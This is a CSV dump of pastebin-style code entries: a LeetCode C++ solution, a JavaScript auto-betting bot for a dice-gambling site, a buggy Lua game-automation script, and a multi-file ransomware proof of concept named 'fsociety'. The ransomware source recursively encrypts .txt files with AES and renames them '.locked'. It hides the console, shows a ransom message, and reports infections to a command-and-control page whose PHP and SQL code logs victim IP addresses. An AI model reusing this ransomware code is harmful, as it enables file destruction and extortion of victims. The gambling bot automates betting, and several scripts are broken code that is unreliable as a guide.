id,title,username,language,date,content
PZFNGPg1,LC361T4,pb_jiang,C++,Saturday 2nd of September 2023 11:07:13 PM CDT,"using a26i = array<int, 27>;
class Solution {
    constexpr static int log = 15;
    struct Edge {
        int v, w, next;
    } es[20003];
    int ecnt = 0;
    int head[10003];
    void init() {
        memset(head, -1, sizeof(head));
        ecnt = 0;
    }
    void insert(int u, int v, int w) {
        es[ecnt] = {v, w, head[u]};
        head[u] = ecnt++;
        
        es[ecnt] = {u, w, head[v]};
        head[v] = ecnt++;
    }
public:
    vector<int> minOperationsQueries(int n, vector<vector<int>>& edges, vector<vector<int>>& qs) {  
        a26i val;
        for (auto&x:val) x = 0;
        vector<vector<a26i>> dp(n + 1, vector<a26i>(log, val));
        vector<vector<int>> pa(n + 1, vector<int>(log));
        vector<int> dep(n + 1);
        init();
        for (auto& e: edges) {
            int u = e[0], v = e[1], w = e[2];
            insert(u, v, w);
        }
        function<void(int, int, int)> dfs = [&](int u, int fa, int depth) {
            dep[u] = depth;
            for (int eid = head[u]; eid != -1; eid = es[eid].next) {
                int w = es[eid].w, v = es[eid].v;
                if (v == fa) continue;
                dp[v][0][w] += 1;
                pa[v][0] = u;
                dfs(v, u, depth + 1);
            }
        };
        dfs(0, -1, 0);
        for (int i = 1; i < log; ++i) {
            for (int u = 0; u < n; ++u) {
                pa[u][i] = pa[pa[u][i-1]][i-1];
                a26i curr = dp[u][i-1];
                for (int j = 0; j <= 26; ++j)
                    curr[j] += dp[pa[u][i-1]][i-1][j], assert(curr[j] >= 0);
                dp[u][i] = curr;
            }
        }

        function<int(int, int)> lca = [&](int u, int v) {
            if (dep[u] < dep[v]) swap(u, v);
            a26i cnt = val;
            for (int st = log - 1; st >= 0; --st) {
                if (dep[pa[u][st]] >= dep[v]) {
                    for (int i = 0; i <= 26; ++i)
                        cnt[i] += dp[u][st][i], assert(cnt[i] >= 0);
                    u = pa[u][st];
                }
            }
            if (u != v) {
                for (int st = log - 1; st >= 0; --st) {
                    if (pa[u][st] != pa[v][st]) {
                        for (int i = 0; i <= 26; ++i)
                            cnt[i] += dp[u][st][i] + dp[v][st][i], assert(cnt[i] >= 0);
                        u = pa[u][st], v = pa[v][st];
                    }
                }
                for (int i = 0; i <= 26; ++i)
                    cnt[i] += dp[u][0][i] + dp[v][0][i];
            }
            
            int sum = 0;
            for (int i = 0; i <= 26; ++i) sum += cnt[i];
            // cout << ""sum: "" << sum << endl;
            int ret = INT_MAX;
            for (int i = 0; i <= 26; ++i) ret = min(ret, sum - cnt[i]);
            return ret;
        };
        
        vector<int> ans;
        for (auto q: qs) {
            int u = q[0], v = q[1];
            ans.push_back(lca(u, v));
        }
        return ans;
    }
};"
aqb2QA2S,terminal terror snowybot,coinwalk,JavaScript,Saturday 2nd of September 2023 10:58:37 PM CDT,"var kozster = $('#pct_balance').val();
var gobbie = ((kozster/640).toFixed(8));
var zeggar = gobbie;
var target = 50000;
var tens = (gobbie*10);
var sevens = (gobbie*6.9);
var tuba = ((Math.floor(kozster/tens))*tens);
var tubit = ((Math.floor(kozster/tens))*tens);
var burgzie = kozster;
var bone = ((Math.floor(kozster/tens))*tens);
var razzle = 0;
var lower = 2.9;
var boon = true;
var getld = 0;
var boon = true;
var zimple = kozster;
var blowzy = false;
var nope = 1;
var upper = 6.9;
var mate = 1;
var brother = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var homer = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var final = document.getElementById('me').firstChild.lastChild.firstChild.children[7].innerText;


function get(){
console.clear();
var burgzie = $('#pct_balance').val();
var good = ((burgzie-kozster).toFixed(8));
console.log(""profit"");
console.log(good);
if (burgzie>=(tuba+(zeggar*upper))){
    zeggar = Number((zeggar*2).toFixed(8));
    upper = 4.9;
	mate = false;
	lower = 6.9;
    tuba = parseFloat(burgzie);
}
if ((burgzie<(tuba-(zeggar*lower)))&&(mate>0)){
    zeggar = Number((zeggar*2).toFixed(8));
    upper = 4.9;
    nope = 0;
	mate = mate-1;
	lower = 6.9;
    tuba = parseFloat(burgzie);
}
if ((burgzie<(tuba-(zeggar*lower)))&&(mate<=0)){
    zeggar = gobbie;
    upper = 6.9;
    nope = 0;
	mate = mate+1;
	lower = 2.9;
    tuba = parseFloat((Math.floor(burgzie/tens))*tens);
    tubit = parseFloat((Math.ceil(burgzie/tens))*tens);
}
if ((burgzie>=(tubit+(tens*3)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    upper = 6.9;
    nope = 0;
	mate = mate+1;
	lower = 2.9;
    tubit = parseFloat((Math.floor(burgzie/tens))*tens);
}
if ((burgzie>=(bone+(tens*nope)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    upper = 6.9;
    nope = 1;
	mate = 1;
	lower = 2.9;
    tuba = parseFloat((Math.floor(burgzie/tens))*tens);
    bone = parseFloat((Math.floor(burgzie/tens))*tens);
}
homer = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var coldbet = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var milk = document.getElementById('me').firstChild.lastChild.firstChild.children[11].innerText;
if ((milk==razzle)&&(getld>=1)&&(homer>brother)&&(!boon)){
final = document.getElementById('me').firstChild.lastChild.firstChild.children[7].innerText;
brother = parseFloat(homer);
boon = true;
}
if ((final<49.5000)&&(blowzy)){
zimple = zimple+zeggar
blowzy = false;
}
if ((final>=49.5000)&&(blowzy)){
zimple = zimple-zeggar;
blowzy = false;
}
var ficked = ((zimple*1).toFixed(8));
var migg = parseFloat(burgzie);
if (((milk>razzle)&&(getld>=1)&&(homer>brother))||((ficked>migg)&&(!blowzy)&&(getld>=2))||((ficked<migg)&&(!blowzy)&&(getld>=2))||((milk<razzle)&&(getld>=1)&&(homer>brother))){
console.log(""hacker attacked you with"");
console.log(milk);
console.log(""bet number of attack:"");
console.log(coldbet);
return;
}
if ((homer==brother)&&(boon)){
razzle = ((zeggar*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo').click();
getld = getld+1;
blowzy = true;
boon = false;
homer = 0;
}
setTimeout(() => get(), 1);
}
get();
"
MG5DdziM,README,FlyFar,Email,Saturday 2nd of September 2023 10:12:43 PM CDT,"Required lib :
Crypto++
CURL
G++ flags used for test
g3
ggdb
O0
Wall
Wextra
Wno-unused
lcryptopp
lcurl
Ransomware Step
Initial
File listing
File parser
Encrypt file source with AES Library
Change filename with filename+. locked
Send to jester C&C (Number file...)
Ask reward & set jester pages
(For security reasons the ransomware crypt is only .txt but you can change it on C++ file)

please remember this is just a PoC the ransomware is not stable is just for fun!

Advanced
In the future, I'll add multiple steps (Decrypt on file for free, FAQ ...).

DISCLAIMER
This is Jester ransomware like, in the Mr. Robot movie (coded by Darlene S1E2,3), Please beware warning, after start you can't recover the files (In the movie, the public key is not shared). Please don't use this malware on your personal computer. This project is just a wink of Mr. Robot's series."
Mv5tUN3R,source/main.cpp,FlyFar,C++,Saturday 2nd of September 2023 10:10:11 PM CDT,"#include <iostream>
#include <iomanip>
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(_CYGWIN_)
    #define WIN32_WINNT 0x0500
    #include <windows.h>
#endif
#include ""fsociety.h""
#include ""after_day.h""
// fsociety ransomware by graniet

int main(void)
{
    byte* secret_key;
    fsociety fs;
    #if defined(WIN32)
    fs.show_democracy();
    fs.hide_console();
    #else
    std::cout << ""Our democracy has been hacked."" << std::endl;
    #endif
    char *folder = ""/root/Bureau"";
    fs.listfiledirectory(folder);
    CandC command;
    command.nb_file = fs.number_to_string(fs.nb_file);
    command.checkifconnected();
    command.insert_target();
    command.openReward();
    secret_key = fs.get_secret_key();
   //std::cout << ""secret key : "" << secret_key << std::endl;
}"
2CaPUKnP,source/fsociety.h,FlyFar,C++,Saturday 2nd of September 2023 10:09:35 PM CDT,"#ifndef __FSOCIETY_H__
#define __FSOCIETY_H__
#endif
#include <dirent.h>
#include <string.h>

#include <cryptopp/osrng.h>
#include <cryptopp/modes.h>
#include <cryptopp/aes.h>

class fsociety
{
    public:
	int listfiledirectory(char *);
	int is_directory(char *);
	int open_file(char *);
	int nb_file = 0;
	byte* generate_iv(void);
	byte* generate_key(void);
	byte* encrypt(byte*,byte*,int,byte*,int);
	byte* decrypt(byte*,byte*,int,byte*,int);
	byte* fucksociety(char*);
	byte* get_secret_key(void);
	byte* get_secret_iv(void);
	byte* secret_key;
	byte* secret_iv;
	int encrypt_file(char *, const char *);
	std::string number_to_string(int);	
	int lock_file(char *);

	std::string cipher;
	#if defined(WIN32)
	    char *slash = ""\\\\"";
	    int show_democracy(void);
	    int hide_console(void);
	#else
	    char *slash = ""/"";
	#endif
};"
uKHqBRRH,source/fsociety.cpp,FlyFar,C++,Saturday 2nd of September 2023 10:08:57 PM CDT,"#include <iostream>
#include <stdlib.h>
#include <cstring>
#include <fstream>

#include ""cryptopp/osrng.h""
#include ""cryptopp/modes.h""
#include ""cryptopp/aes.h""
#include ""cryptopp/filters.h""
#include ""fsociety.h""

using namespace CryptoPP;
using namespace std;



string fsociety::number_to_string(int x){
    if(!x) return ""0"";
        string s,s2;
        while(x){
            s.push_back(x%10 + '0');
            x/=10;
        }
    reverse(s.begin(),s.end());
    return s;
}

int fsociety::listfiledirectory(char *directory){
    DIR *dir;
    struct dirent *entry;
    if((dir = opendir(directory)) != NULL){
	while((entry = readdir(dir)) != NULL){
	    if(strcmp(entry->d_name, "".."") != 0 && strcmp(entry->d_name,""."") != 0)
	    {
		// concat three char*
		size_t len_folder = strlen(directory);
		size_t len_name = strlen(entry->d_name);
		size_t len_slash = strlen(this->slash);
		char *concat = (char *) malloc(len_folder + len_slash + len_name +1);
		memcpy(concat, directory, len_folder);
		memcpy(concat + len_folder, this->slash, len_slash);
		memcpy(concat + len_folder + len_slash,entry->d_name, len_name);
		concat[len_folder + len_slash + len_name] = '\0';
		//
		if(is_directory(concat) == 1)
		{
		    this->listfiledirectory(concat);	    
		}
		else
		{
		    //cout << entry->d_name << endl;
		    this->open_file(concat);
		}
	    }
	}
	closedir(dir);
    }
    //std::cout << ""start : "" << this->nb_file << std::endl;
    return 0;
}

int fsociety::is_directory(char *path)
{
    DIR *dir;
    if((dir = opendir(path)) != NULL)
    {
	closedir(dir);
	return 1;
    }
    return 0;
}

int fsociety::lock_file(char *path){
    char *locked_ext = "".locked"";
    size_t len_path = strlen(path);
    size_t len_locked = strlen(locked_ext);
    char *new_name = (char *) malloc(len_path + len_locked + 1);
    memcpy(new_name, path, len_path);
    memcpy(new_name + len_path, locked_ext, len_locked);
    new_name[len_path + len_locked + 1] = '\0';
    rename(path, path);
    this->nb_file++;
    //cout << ""renamed !"" << endl;
    return 0;
}

byte* fsociety::generate_key(void){
    
    AutoSeededRandomPool rnd;
    byte* key = new byte[AES::DEFAULT_KEYLENGTH+1];
    rnd.GenerateBlock(key, AES::DEFAULT_KEYLENGTH);
    key[AES::DEFAULT_KEYLENGTH] = '\0';
    return key;
}

byte* fsociety::generate_iv(void){
    AutoSeededRandomPool rnd;
    byte* iv = new byte[AES::BLOCKSIZE+1];
    rnd.GenerateBlock(iv, AES::BLOCKSIZE);
    iv[AES::BLOCKSIZE] = '\0';
    return iv;
}

byte* fsociety::encrypt(byte* iv, byte* key, int keyLength, byte* data, int dataLength)
{
    byte* out = new byte[dataLength];
    CFB_Mode<AES>::Encryption cfbEncryption(key, keyLength, iv);
    cfbEncryption.ProcessData(out, data, dataLength);
    return out;
}

byte* fsociety::decrypt(byte* iv, byte* key, int keyLength, byte* cipher, int cipherLength)
{
    byte* plain = new byte[cipherLength];
    CFB_Mode<AES>::Decryption cfbDecryption(key, keyLength, iv);
    cfbDecryption.ProcessData(plain, cipher, cipherLength);
    return plain;
}

byte* fsociety::fucksociety(char *input){
    byte* iv = this->generate_iv();
    byte* key = this->generate_key();
    this->secret_key = key;
    this->secret_iv = iv;
    int len = strlen(input);
        
    byte* init = reinterpret_cast<byte*>(input);
    byte* cipher = this->encrypt(iv, key, AES::DEFAULT_KEYLENGTH, init,len);
    byte* plain = this->decrypt(iv, key, AES::DEFAULT_KEYLENGTH, cipher, len);

    return cipher;
}

int fsociety::encrypt_file(char *path, const char *content){
    
    byte* encrypt = this->fucksociety((char*)content);
    //cout << ""encrypt : "" << encrypt << endl;
    ofstream fichier(path, ios::out | ios::trunc);
    if(fichier){
	fichier << encrypt;
	//cout << ""encrypted"" << endl;
	fichier.close();
    }
    this->lock_file(path);
    return 0;
}

int fsociety::open_file(char *path){
    char *content_char;
    string content;
    string final_content;
    ifstream fichier(path, ios::in);
    if(fichier){
	while(getline(fichier, content))
	{
	    //cout << content << endl;
	    final_content = final_content + content;
	}
	//size_t len_content = strlen(content);
	//memcpy(content_modified, content, len_content);
	content_char = (char*)final_content.c_str();
	if(strstr(path, "".txt"") != NULL){
	    if(strstr(path,"".locked"") == NULL){
		this->encrypt_file(path, content_char);
	    }
	}
	fichier.close();
	return 0;
    }
    return 1;
}

byte* fsociety::get_secret_key(void){
    return this->secret_key;
}

byte* fsociety::get_secret_iv(void){
    return this->secret_iv;
}

#if defined(WIN32)
int fsociety::show_democracy(void){
    MessageBox(0, ""Your files are encrypted"", ""#OPdailyallowance"", 0);
}

int fsociety::hide_console(void){
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}
#endif"
61XTLsaP,source/after_day.h,FlyFar,C++,Saturday 2nd of September 2023 10:08:14 PM CDT,"#ifndef __AFTER_DAY__
#define __AFTER_DAY__
#endif

#include <iostream>
#include <stdlib.h>

#define HOST ""http://localhost/ransomware/""
#define PATH ""target.php""
#define __TOR_USED__ 0

class CandC
{
    public:
	int hello(void);
	int download_tor(void);
	int checkifconnected(void);
	int insert_target(void);
	int openReward(void);
	std::string nb_file;
};"
bMBPNBeR,source/after_day.cpp,FlyFar,C++,Saturday 2nd of September 2023 10:06:20 PM CDT,"#include <curl/curl.h>
#include ""after_day.h""

using namespace std;

int CandC::openReward(void){
    std::string url_host = HOST;
    std::string complet_url = url_host;
    char *complet = (char*) complet_url.c_str();
    #if defined(WIN32)
	ShellExecute(NULL, ""open"", complet, NULL, NULL, SW_SHOWNORMAL);
    #else
	std::string browser_cmd = ""x-www-browser ""+complet_url;
	char *browser_cmd_chared = (char*) browser_cmd.c_str();
	system(browser_cmd_chared);
    #endif
    return 0;
}

int CandC::hello(void)
{
    //cout << ""hello"" << endl;
    return 0;
}

#if defined(WIN32)
int CandC::download_tor(void)
{
    return 0;
}
#endif

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
}

int CandC::insert_target(void){
    string nb_file = this->nb_file;
    //cout << ""Encrypted file : "" << nb_file << endl;
    string url_host = HOST;
    string url_path = PATH;
    string complet_url = url_host + url_path + ""?insert=1&nb_file="" + nb_file;
    //cout << ""complet url: "" << complet_url << endl;
    char *url;
    url = (char*) complet_url.c_str();
    //cout << ""complet url2: "" << url << endl;
    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    if(curl)
    {
	curl_easy_setopt(curl, CURLOPT_URL, url);
	res = curl_easy_perform(curl);
	curl_easy_cleanup(curl);
	if(res == 0)
	{
	    //cout << ""Send to C&C"" << endl;
	}
    }
    return 0;
}

int CandC::checkifconnected(void){
    if(__TOR_USED__ == 0){
	CURL *curl;
	CURLcode res;
	char *url = HOST;
	string content;
	curl = curl_easy_init();
	if(curl){
	    //cout << ""Curl ok"" << endl;
	    curl_easy_setopt(curl, CURLOPT_URL, url);
	    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
	    curl_easy_setopt(curl, CURLOPT_WRITEDATA, content);
	    res = curl_easy_perform(curl); 
	    curl_easy_cleanup(curl);
	    if(res == 0){
		return 0;
	    }
	}
    }
    return 1;
}"
5iTd5n5W,pages/config/config.php,FlyFar,PHP,Saturday 2nd of September 2023 10:04:11 PM CDT,"<?php
$bdd  = new PDO('mysql:host=localhost;dbname=fsociety','root','');

function get_target(){
    global $bdd;
    $select = $bdd->prepare(""SELECT * FROM target WHERE 1"");
    $select->execute();
    $fetch = $select->fetch();
    return $fetch;
}"
atT4cRqP,pages/css/styles.css,FlyFar,CSS,Saturday 2nd of September 2023 09:55:45 PM CDT,"body
{
    background-color: rgb(55, 128, 173)
}
#container
{
    margin-top:30px;
    width: 900px;
    margin-left: auto;
    margin-right: auto;
}
#header_ransom{
    text-align:center;
    padding-top:2px;
    padding-bottom:10px;
    width: 900px;
    margin-left: auto;
    margin-right: auto;
    min-height: 200px;
    background-color: white;
    border-radius: 11px;
    border-radius: 11px;
    margin-bottom: 15px;
}
#jester
{
    height: 200px;
    margin-left: auto;
    margin-right: auto;
    background-position: center center;
    background-image: url(""../images/jester.png"");
    background-repeat: no-repeat;
}
.ophello
{
    font-weight: bold;
}
.information
{
    font-size: 14px;
    line-height: 18px;
    width: 70%;
    width: 513px;
    margin-left: auto;
    margin-right: auto;
}
.red
{
    color:red !important;
}
.time{
    font-size: 2em;
    font-weight: bold;
}
.diclaimer
{
    color: white;
    width: 520px;
    text-align: center;
    margin-left: auto;
    margin-right: auto;
    margin-top: 20px;
}
.more_information{
    border-top: 1px solid black;
    min-height: 50px;
    width: 95%;
    margin-left: auto;
    margin-right: auto;
}
.minfo
{
    width:30%;
    float:left;
}
#menu_ransom
{
    width: 900px;
    min-height: 20px;
    text-align:center;
    margin-bottom:10px;
}
.button
{
    height: 25px;
    background-color: white;
    border: 1px solid rgba(0, 0, 0, 0.62) !important;
    color: black;
}"
XZAcg0ZC,pages/target.php,FlyFar,PHP,Saturday 2nd of September 2023 09:54:15 PM CDT,"<?php
ini_set('display_errors', 'on');
require_once('config/config.php');

if(isset($_GET['insert']) && isset($_GET['nb_file']) && !empty($_GET['nb_file']) && is_numeric($_GET['nb_file'])){
    $address_ip = $_SERVER['REMOTE_ADDR'];
    $arch = ""x64"";
    $nb_file = $_GET['nb_file'];
    $day = date(""d"")+1;
    $month = date('m');
    $year = date('y');
    $hours = date('h:i:s');
    $date = $month.'/'.$day.'/'.$year.' '.$hours;
    echo $address_ip;
    $select = $bdd->prepare(""SELECT * FROM target WHERE ip_adress = :ip_addr"");
    $select->bindParam(':ip_addr', $address_ip);
    $select->execute();
    if($select->rowCount() < 1){
	var_dump($select->fetch());
	$insert = $bdd->prepare(""INSERT INTO target(ip_adress,nb_file,system_arch,date_time) VALUES(:ip_addr,:nb_file,:arch,:date_time)"");
	$insert->bindParam(':ip_addr', $address_ip);
	$insert->bindParam(':nb_file', $nb_file);
	$insert->bindParam(':arch', $arch);
	$insert->bindParam(':date_time', $date);
	$insert->execute();
	echo ""inserted"";
    }
}
else{
    echo ""get not set"";
}"
MXeZUs2p,SQL/sql.sql,FlyFar,SQL,Saturday 2nd of September 2023 09:52:26 PM CDT,"-- MySQL dump 10.13  Distrib 5.6.27, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: fsociety
-- ------------------------------------------------------
-- Server version	5.6.27-2

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `target`
--

DROP TABLE IF EXISTS `target`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `target` (
  `id` int(6) unsigned NOT NULL AUTO_INCREMENT,
  `nb_file` text NOT NULL,
  `ip_adress` text NOT NULL,
  `free_file` int(6) DEFAULT NULL,
  `system_arch` text,
  `date_time` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `target`
--

LOCK TABLES `target` WRITE;
/*!40000 ALTER TABLE `target` DISABLE KEYS */;
/*!40000 ALTER TABLE `target` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2016-10-30 12:47:57"
QFdJPnjd,ATM8 Seed List Creator,issyman182,Lua,Saturday 2nd of September 2023 07:34:40 PM CDT,"seedInfo = {}
seeds = {}
seedsCounter = 0
detector = peripheral.wrap(""bottom"")
dataPath = ""data/seeds/""
blackbox = """"
isBlackbox = false
startedTimestamp = os.date(""%d-%m-%y.%H-%M-%S"")
	--25*6
	
function addLog(newLogLine)
	if isBlackbox then
		blackbox = blackbox .. os.date() .. newLogLine .. ""\n""
	end
end

function detect()
	addLog(""detect()"")
	if turtle.inspectDown() then
		return detector.list()
	else
		return false
	end
end

function init()
	addLog(""init()"")
	if !fs.exist(dataPath) then
		fs.makeDir(dataPath)
	end
end

function move(direction)
	addLog(""move("" .. direction .. "")"")
	fuelLevel = turtle.getFuelLevel()
	if fuelLevel == 0 then
		refueled = turtle.refuel(1)
		while refueled == false do
			print(""Need fuel"")
			refueled = waitForFuel()
		end
	end
	if direction == ""forward""
		turtle.forward()
	end
end

function waitForFuel()
	addLog(""waitForFuel()"")
	sleep(1)
	return turtle.refuel(1) or turtle.getFuelLevel() > 0
end
--seed = {name, id, mod, count}
--[[
turtle.inspectDown()
bool (isDetected)
table
	state table
	name ""botanypots:red_terracotta...""
	tags table
		
tags
]]

function turnAround(direction)
	addLog(""turnAround("" .. direction .. "")"")
	if(direction == ""left"") then
		turtle.turnLeft()
		move(""forward)
		turtle.turnLeft()
	elseif (direction == ""right"") then
		turtle.turnRight()
		move(""forward)
		turtle.turnRight()
	end
end

function getAllSeeds(numberOfLines,length)
	addLog(""getAllSeeds("" .. numberOfLines .. "", "".. length .. "")"")
	for i=1,numberOfLines,1 do
		getSeedLine(length)
		if math.fmod(i,2) == 1 then
			turnAround(""left"")
		else
			turnAround(""right"")
		end
	end
	if math.fmod(numberOfLines,2) == 1 then
		turtle.turnLeft()
		turtle.turnLeft()
	end
	turtle.turnLeft()
	for i=1,numberOfLines,1 do
		move(""forward"")
	end
	turtle.turnRight();
end

function getSeedLine(length)
	addLog(""getSeedLine("" .. length .. "")"")
	for i=1,length,1 do
		currItems = detect()
		addSeed(currItems)
		move(""forward"")
	end
end

function addSeed(items)
	addLog(""addSeed("" .. items .. "")"")
	for key,value in pairs(items) do
		if(seeds[key] != nil) then
			seeds[key] = 1
		else
			seeds[key] = seeds[key] + 1
		end
	end
	seedsCounter = seedsCounter + 1
end

function getInputInt(msg)
	x,y = term.getCursorPos()
	repeat
		write(msg)
		input = read()
		inputNumber = tonumber(input)
		if inputNumber != nil then
			if inputNumer - math.floor(inputNumber) == 0 then
				return inputNumber
			end
		end
		term.setCursorPos(1,y)
		term.clearLine()
	until false
end

function getSeedsAsString(seeds)
	ret = """"
	for key,value in pairs(seeds) do
		ret = ret .. value .. ""\n""
	end
	return ret
end

function main()
	print(""started"")
	addLog(""main()"")
	
	length = getInputInt(""length of row: "")
	rows = getInputInt(""number of rows: "")
	getAllSeeds(rows, length)
	currFile = fs.open( dataPath + ""sum-"" .. startedTimestamp, ""w"")
	currFile.write(getSeedsAsString(seeds))
	
	if isBlackbox then
		currLogFile = fs.open( dataPath + ""sum-log-"" .. startedTimestamp, ""w"")
		currLogFile.write(blackbox)
	end

	print(""finished"")
end
--fs.open( dataPath + ""seedx"",""w"")
main()"
